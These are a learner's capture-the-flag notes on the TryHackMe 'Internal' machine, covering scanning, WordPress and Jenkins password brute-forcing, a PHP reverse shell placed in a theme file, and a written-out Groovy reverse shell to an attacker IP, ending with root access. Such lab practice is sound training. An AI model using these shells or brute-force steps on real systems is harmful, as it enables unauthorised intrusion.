# 1 - scanning + info gathering 
# 2 - enumeration
# 3 - exploit?

### 1 ###


(kali㉿kali)-[~/THM/practice/internal]
└─$ nmap -sC -sV 10.10.80.157 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-21 12:07 EST
Nmap scan report for 10.10.80.157
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.32 seconds

        # ssh (maybe some tunnelling) + a web server
        # need to save the ip in hosts (?)
# scan of higher ports --> resulted in nothing









### 2 ###
# from a dirb search you can see there's a blog, and a phpmyadmin page --> likely to inlude some sqli. The scan:
(kali㉿kali)-[~/THM/practice/internal]
└─$ dirb http://10.10.80.157 -w /usr/share/wordlists/dirb/common.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Feb 21 12:10:50 2022
URL_BASE: http://10.10.80.157/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Stopping on warning messages

-----------------

GENERATED WORDS: 4613                                                          

---- Scanning URL: http://10.10.80.157/ ----
==> DIRECTORY: http://10.10.80.157/blog/                                                                   
+ http://10.10.80.157/index.html (CODE:200|SIZE:10918)                                                     
==> DIRECTORY: http://10.10.80.157/javascript/                                                             
==> DIRECTORY: http://10.10.80.157/phpmyadmin/                                                             
+ http://10.10.80.157/server-status (CODE:403|SIZE:277)                                                    
==> DIRECTORY: http://10.10.80.157/wordpress/                                                              
                                                                                                           
---- Entering directory: http://10.10.80.157/blog/ ----
+ http://10.10.80.157/blog/index.php (CODE:301|SIZE:0)                                                     
==> DIRECTORY: http://10.10.80.157/blog/wp-admin/                                                          
==> DIRECTORY: http://10.10.80.157/blog/wp-content/                                                        
==> DIRECTORY: http://10.10.80.157/blog/wp-includes/                                                       
+ http://10.10.80.157/blog/xmlrpc.php (CODE:405|SIZE:42)

---- Entering directory: http://10.10.80.157/phpmyadmin/ ----
==> DIRECTORY: http://10.10.80.157/phpmyadmin/doc/                                                         
+ http://10.10.80.157/phpmyadmin/favicon.ico (CODE:200|SIZE:22486)                                         
+ http://10.10.80.157/phpmyadmin/index.php (CODE:200|SIZE:10525)                                           
==> DIRECTORY: http://10.10.80.157/phpmyadmin/js/                                                          
+ http://10.10.80.157/phpmyadmin/libraries (CODE:403|SIZE:277)                                             
==> DIRECTORY: http://10.10.80.157/phpmyadmin/locale/                                                      
+ http://10.10.80.157/phpmyadmin/phpinfo.php (CODE:200|SIZE:10527)                                         
+ http://10.10.80.157/phpmyadmin/setup (CODE:401|SIZE:459)                                                 
==> DIRECTORY: http://10.10.80.157/phpmyadmin/sql/                                                         
+ http://10.10.80.157/phpmyadmin/templates (CODE:403|SIZE:277)                                             
==> DIRECTORY: http://10.10.80.157/phpmyadmin/themes/ 
                                                                                                           
---- Entering directory: http://10.10.80.157/wordpress/ ----
+ http://10.10.80.157/wordpress/index.php (CODE:301|SIZE:0)                                                
==> DIRECTORY: http://10.10.80.157/wordpress/wp-admin/                                                     
==> DIRECTORY: http://10.10.80.157/wordpress/wp-content/                                                   
==> DIRECTORY: http://10.10.80.157/wordpress/wp-includes/                                                  
+ http://10.10.80.157/wordpress/xmlrpc.php (CODE:405|SIZE:42)
 
---- Entering directory: http://10.10.80.157/phpmyadmin/doc/ ----
==> DIRECTORY: http://10.10.80.157/phpmyadmin/doc/html/ 
# (I have omitted directories which seemed less relevant)
        # when seeing the phpmyadmin login there's an error regarding insecure passwords with a link containing some more info
        # error message " #1045 - Access denied for user 'admin'@'localhost' (using password: YES)"
# wordpress site --> likely some RFI or something where we can upload a reverse shell and gain access 
        # either through a comment section or through editing blog posts


# looking for some help - further enumeration can be done with the WPScan tool: 
(kali㉿kali)-[~/THM/practice/internal]
└─$ ls
notes.txt  wpscantest.txt
                                                                                                            
┌──(kali㉿kali)-[~/THM/practice/internal]
└─$ cat wpscantest.txt      
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://internal.thm/blog/ [10.10.80.157]
[+] Started: Mon Feb 21 12:33:00 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'


[i] No plugins Found.


[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.

[+] Finished: Mon Feb 21 12:33:05 2022
[+] Requests Done: 187
[+] Cached Requests: 5
[+] Data Sent: 46.546 KB
[+] Data Received: 18.135 MB
[+] Memory used: 233.953 MB
[+] Elapsed time: 00:00:05
        # going to http://internal.thm/blog/xmlrpc.php show the message "XML-RPC server accepts POST requests only."
        # I am assuming this means we can use a post request to upload something and get something else in return (i.e. a shell)
                # see https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/
# going to http://internal.thm/blog/readme.html I see there is a config.php file somewhere containing connection info --> defo contains some user details...


# another WPScan targeting for the admin user:
(kali㉿kali)-[~/THM/practice/internal]
└─$ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=============================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                 
Trying admin / bratz1 Time: 00:01:53 <                             > (3885 / 14348277)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Feb 21 12:46:18 2022
[+] Requests Done: 4058
[+] Cached Requests: 5
[+] Data Sent: 2.041 MB
[+] Data Received: 2.647 MB
[+] Memory used: 257.707 MB
[+] Elapsed time: 00:02:00





### 3 ###
# trying ot log in, there's an admin email verification page with the email admin@internal.thm
        # we are met with the choice of updating it or keeping it. So of course we'll update it to one we can access (hedvigmaareng@gmail.com)
# using admin:my2boys we got access!
# trying to open wp-config-sample.php


https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/
https://www.google.com/search?q=twentyseventeen+worpress+theme+exploit&client=firefox-b-e&sxsrf=APq-WBsDk6dYA6iFXRdo2AHAqrpGc_DwBw%3A1645465214751&ei=fs4TYqG3LYa4gQainaP4Dg&ved=0ahUKEwih7vXMq5H2AhUGXMAKHaLOCO8Q4dUDCA0&uact=5&oq=twentyseventeen+worpress+theme+exploit&gs_lcp=Cgdnd3Mtd2l6EAMyBggAEBYQHjoHCAAQRxCwAzoECAAQDUoECEEYAEoECEYYAFDiBFjiDGDHDmgBcAF4AIABXIgB_gSSAQE4mAEAoAEByAEIwAEB&sclient=gws-wiz
# checking the posts, we find a to-do list with some credentials --> william:arnold147
        # trying ssh william@internal.thm did not work with this password - nor phpmyadmin


# one of the admin's pages is about their privacy policy - the other contains some info including
        # "Hi there! I'm a bike messenger by day, aspiring actor by night, and this is my website. I live in Los Angeles, have a great dog named Jack, and I like piña coladas. (And gettin' caught in the rain.)"


# to get a reverse shell --> upload to the theme editor (ref second link above)
        # I have previously used the testmonkey one, so I will try to use this again
        # I edit the 404.php error page (copy the contents of php-reverse-shell - modifying LHOST and LPORT)
        (kali㉿kali)-[~/THM/practice/internal]
        └─$ nc -lvnp 4444             
        listening on [any] 4444 ...
        # to execute it, I go to the error page (I think)
        http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
        # and it spawned a shell
        (kali㉿kali)-[~/THM/practice/internal]
        └─$ nc -lvnp 4444                                                                                       1 ⨯
        listening on [any] 4444 ...
        connect to [10.11.59.68] from (UNKNOWN) [10.10.132.94] 39590
        Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
         18:52:44 up 14 min,  0 users,  load average: 0.00, 0.04, 0.08
        USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
        uid=33(www-data) gid=33(www-data) groups=33(www-data)
        /bin/sh: 0: can't access tty; job control turned off
        $ 
        # establishing a better shell
        $ python -c 'import pty; pty.spawn("/bin/bash")'
        www-data@internal:/home$

# from here, some manual enumeration was required --> I could upload linPEAS and use that but creator made sure it would not pick up obvious files like password.txt
# I navigated to /opt
www-data@internal:/opt$ cat wp-save.txt
cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
        # I believe this can be used for ssh? lets try
(kali㉿kali)-[~/THM/practice/internal]
└─$ ssh aubreanna@internal.thm                                                                        130 ⨯
Warning: Permanently added the ECDSA host key for IP address '10.10.132.94' to the list of known hosts.
aubreanna@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Feb 21 18:59:32 UTC 2022

  System load:  0.0               Processes:              114
  Usage of /:   63.7% of 8.79GB   Users logged in:        0
  Memory usage: 34%               IP address for eth0:    10.10.132.94
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.


Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
aubreanna@internal:~$
        # nice one
# having a wuick look around, it seems we got the first flag, and I found group 4 (adm) interesting --> admin privileges?
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ whoami
aubreanna
aubreanna@internal:~$ id
uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)

# jenkins is a website ive came accross before, so I am assuming next objective is to access this? - unlikely williams or aubreannas credentials will work..
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}

aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
aubreanna@internal:~$ ls snap
docker
aubreanna@internal:~$ ls snap/docker
current

        # I went to the url of the jenkins service and also looks like there's a docker container running? howcome?
                # well it didnt work, maybe I need to run the docker image first?

        # after looking around: SSH TUNNELLING!
(kali㉿kali)-[~/THM/practice/internal]
└─$ ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm                                                255 ⨯
aubreanna@internal.thm's password: 
bind [127.0.0.1]:8080: Address already in use
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Feb 21 19:11:07 UTC 2022

  System load:  0.0               Processes:              117
  Usage of /:   63.7% of 8.79GB   Users logged in:        1
  Memory usage: 34%               IP address for eth0:    10.10.132.94
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Feb 21 18:59:34 2022 from 10.11.59.68
aubreanna@internal:~$
        #going to wbsite still did not work...so I looked for some help and killed whatever was already using 127.0.0.1:8080:
(kali㉿kali)-[~/THM/practice/internal]
└─$ lsof -ti:8080 | xargs kill -9
                                                                                                            
┌──(kali㉿kali)-[~/THM/practice/internal]
└─$ ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.132.94
aubreanna@10.10.132.94's password: 
Permission denied, please try again.
aubreanna@10.10.132.94's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Feb 21 19:23:11 UTC 2022

  System load:  0.08              Processes:              115
  Usage of /:   63.7% of 8.79GB   Users logged in:        0
  Memory usage: 34%               IP address for eth0:    10.10.132.94
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Feb 21 19:21:29 2022 from 10.11.59.68
aubreanna@internal:~$
# should work now...and it did!

# aubreanna:bubb13guM!@#123 did not work, neither did admin:my2boys nor william:arnold147
        # so I decided to burp the failed login page --> burp did not work as I was already using the port, so I fired up ZAP and inputted the URL: http://127.0.0.1:8080/login?from=%2F

j_username=ZAP&j_password=ZAP&from=%2F&Submit=Sign+in&remember_me=on 
# ^ these are the parameters, so I tried my way to do the same intruder attack as in burp admin: attack>fuzz

        # to do the attack in burp I simply copied the request form from ZAP, and pasted it into the intruder
        # made sure username=admin and added the field to the password=$$, and then snipered it with the rockyou.txt file..
        #RESULT = admin:spongebob ...

# having a quick look around:
        # 2 idle build executor statuses --> RFI/RFE?
        # users = admin
        # it is clear it expects a job to be built to exploit the system --> "groovy" reverse shell in scripting console

# one method of doing it is creating a new job and building it
        # I have tried this before (doesnt mean I cannot again) but I will therefore try to do it another way:

# method (https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6):
        # 1 manage jenkins + under "tools and actions" script console
        # 2 paste revsh.groovy:
                String host="10.11.59.68";
                int port=4445;
                String cmd="/bin/bash";
                Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
        # 3 nc listener for port 4445
        # 4 run the script:
                (kali㉿kali)-[~/THM/practice/internal]
                └─$ nc -lvnp 4445                                                                                       1 ⨯
                listening on [any] 4445 ...
                connect to [10.11.59.68] from (UNKNOWN) [10.10.79.251] 55264

# some manual enumeration shows we do not have a lot of privileges:
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
whoami
jenkins

# remembering from earlier there was some interesting info in the /opt folder:
cd opt
ls
note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
# looks like we got some root credentials, so I will try and ssh my way in with these:
(kali㉿kali)-[~/THM/practice/internal]
└─$ ssh root@internal.thm                             
root@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Feb 22 17:07:10 UTC 2022

  System load:  0.0               Processes:              114
  Usage of /:   63.7% of 8.79GB   Users logged in:        1
  Memory usage: 40%               IP address for eth0:    10.10.79.251
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
root@internal:~# whoami
root
root@internal:~#

# nice one --> flag:
root@internal:~# cat root.txt
THM{d0ck3r_d3str0y3r}

### could have upgraded the shell:
                        python -c 'import pty; pty.spawn("/bin/bash")'
                        jenkins@jenkins:/var/log$




### other nothes / further ###
# trying to use burp to check what fields are required during login I come accross the wordpress_test_cookie
        # so I am assuming there might be some cookie manipulation included?
# the fields are: log, pwd, wp-submit, redirect_to, testcookie


(kali㉿kali)-[~]
└─$ searchsploit wordpress 5.4.2            
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities       | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                 | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection               | php/webapps/48918.sh
-------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results










### final thoughts ###
# this was somewhat more challenging than I had done before for a couple reasons:
# 1 - the internal docker/ssh tunnelling 
        # I had done something on this before but not extensively, and then being met with another web app inside of the ssh was new to me
# 2 - the internal web app running on localhost 8080 - same as burp
        # this made it less straightforward to send a login request to intruder, so I got creative and used ZAP for some help with the header text
        # then I copied this to burp nd performed the sniper attack as per usual
# I have also realised, that whenever there's a 'snap' directory, this most likely means its running on a docker container
# ++ start checking opt when doing manual enumeration!!!
